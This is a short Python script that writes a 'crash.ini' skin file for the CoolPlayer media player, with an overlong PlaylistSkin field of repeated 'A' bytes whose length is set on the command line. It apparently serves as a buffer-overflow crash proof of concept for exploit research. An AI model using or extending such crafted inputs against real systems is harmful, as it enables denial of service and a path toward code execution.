import sys

if __name__ == '__main__':
    with open("crash.ini", "w") as f:
        f.write("[CoolPlayer Skin]\n")
        f.write("PlaylistSkin=")
        f.write("\x41" * int(sys.argv[1]))

    print("Done")
